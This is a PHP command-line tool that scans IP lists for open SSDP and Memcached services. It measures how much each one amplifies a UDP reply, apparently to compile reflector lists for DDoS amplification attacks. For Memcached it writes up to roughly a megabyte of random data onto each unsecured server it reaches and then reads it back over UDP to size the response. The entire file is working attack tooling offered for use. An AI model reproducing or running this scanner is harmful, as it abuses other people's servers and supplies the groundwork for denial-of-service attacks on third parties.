<?php
//我要如何运行？
//php 这个ssdp过滤脚本的名称 输入的列表 输出到哪里 验证包根据放大倍数 线程
include __DIR__ . "/config.php";

set_error_handler(function ($errno, $errstr, $errfile, $errline, array $errcontext) {
	// error was suppressed with the @-operator
	if (0 === error_reporting()) {
		return false;
	}

	throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});
function puts($data) {
	file_put_contents("./log", $data . PHP_EOL, FILE_APPEND);
}
function MemcachedTester($host, $timeout = 1) {
	$m = new Memcache;
	try {
		$result = @$m->connect($host, 11211, $timeout) OR die();
		$puts = "[MemcTester] $host : connected, ";
		if ($stats = $m->getStats()) {
			$puts .= "success stats query, ";
		}
		$max = 1000000;
		$inject = random_bytes($max);
		$keys_seted = FALSE;
		while ($max > 1000) {
			if ($m->set(md5($host), $inject) == TRUE) {
				$keys_seted = TRUE;
				$puts .= "Key MaxSize: $max; ";
				break;
			} else {
				$inject = substr($inject, 1);
				$max = $max * 0.9;
				$puts .= "Size Over, try $max";
			}
		}
		if ($max <= 1000) {
			die();
		}
		$result = MemcachedUDPGet($host, $timeout, md5($host));
		if ($result) {
			puts($puts);
			if ($keys_seted) {
				$m->delete(md5($host));
			}
			return strlen($result);
		}
	} catch (Exception $e) {
		puts($puts);
		die();
	}
}
function MemcachedUDPGet($host, $timeout = 1, $key) {
	return mc_udprelay($host, $timeout, "get $key");
}
function LengthMemcachedUDPStat($host, $timeout = 1) {
	$length = strlen(mc_udprelay($host, $timeout, "stats"));
	if ($length > 0) {
		puts("[UDP Relay] $host Response length : $length");
	}

	return $length;
}
function mc_udprelay($host, $timeout = 1, $data) {
	$data = "\x00\x00\x00\x00\x00\x01\x00\x00$data\r\n";
	$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
	socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
	if (socket_connect($socket, $host, 11211)) {
		socket_send($socket, $data, strLen($data), 0);
		$buf = "";
		$from = "";
		$port = 0;
		$endtime = microtime(TRUE) + $timeout;
		while (microtime(true) <= $endtime) {
			try {
				$buf .= socket_read($socket, 4096);
			} catch (Exception $e) {
				break;
			}

		}
		socket_close($socket);
		return $buf;
	} else {
		puts("$host : failed to connect");
	}

}

function MSEARCH($host, $timeout = 1) {
	$data = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n";
	$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
	socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
	socket_connect($socket, $host, 1900);
	socket_send($socket, $data, strLen($data), 0);
	$buf = "";
	$from = "";
	$port = 0;
	@socket_recvfrom($socket, $buf, 1000, 0, $from, $port);
	socket_close($socket);
	return strlen($buf);
}

function start_threading($input, $output, $responselength, $maxthreads) {
	$self = basename($_SERVER["SCRIPT_FILENAME"], '.php') . '.php';
	$usage = "Usage: php {$self} [Input.txt] [Output.txt] [Response Size] [Threads]";
	$error = "";
	if (strlen($input) == 0) {
		$error = "Error: Invalid Filename!";
	}
	if (strlen($output) == 0) {
		$error .= "\nError: Invalid Filename!";
	}
	if (is_numeric($responselength) == false) {
		$error .= "\nError: Invalid Response Length!";
	}
	if ($maxthreads < 1 || $maxthreads > 1000) {
		$error .= "\nError: Invalid Threads!";
	}
	if (strlen($error) >= 1) {
		die($error . "\n" . $usage . "\n");
	}
	print("\nSSDP Filter\t//Memcached Filter\nCoded by Layer4\n\n");
	print("nope.I am the memcached filter. faq -- arily\n");
	print("This code got a serious problem on calculating amp rate\nI don't know if it's my code's fault or the php's falut\nAlso distortion of the result will causing by the slow internet connection, slow CPU speed or the slow iface.\nIncrease timeout limit will kind of decreasing the distortion\n");
	$threads = 0;
	$threadarr = array();
	$j = 0;
	$tries = 0;
	$handle = fopen($input, "r");
	while (!feof($handle)) {
		$line = fgets($handle, 4096);
		if (preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $line, $match)) {
			//正则匹配IP
			if (filter_var($match[0], FILTER_VALIDATE_IP)) {
				//PHP带的合法IP过滤器
				$ip = $match[0];
				JMP:
				if ($threads < $maxthreads) {
					if (floor(++$tries / 100) * 100 == $tries) {
						echo "$tries tests" . PHP_EOL;
					}

					$pipe[$j] = popen("php {$self} {$ip} {$output} {$responselength} THREAD", 'w'); //('php' . ' ' . $self . ' ' . $ip . ' ' . $output . ' ' . $responselength . ' ' . 'THREAD')
					$threadarr[] = $j;
					$j++; //$j = $j + 1;
					$threads++; //$threads = $threads + 1;
				} else {
					usleep(50000);
					foreach ($threadarr as $index) {
						pclose($pipe[$index]);
						$threads--; //$threads = $threads - 1;
					}
					$j = 0;
					unset($threadarr);
					goto JMP;
				}
			}
		}
	}
	fclose($handle);
}

function threadfound(array $argv) {
	$thread = false;
	foreach ($argv as $arg) {
		if ($arg == 'THREAD') {
			$thread = true;
			break;
		}
	}
	return $thread;
}

function addentry($file, $entry) {
	if (!file_exists($file)) {
		touch($file);
		chmod($file, 0777);
	}
	$fh = fopen($file, 'a') or die("Can't open file: " . $file);
	fwrite($fh, $entry . PHP_EOL);
	fclose($fh);
}

?>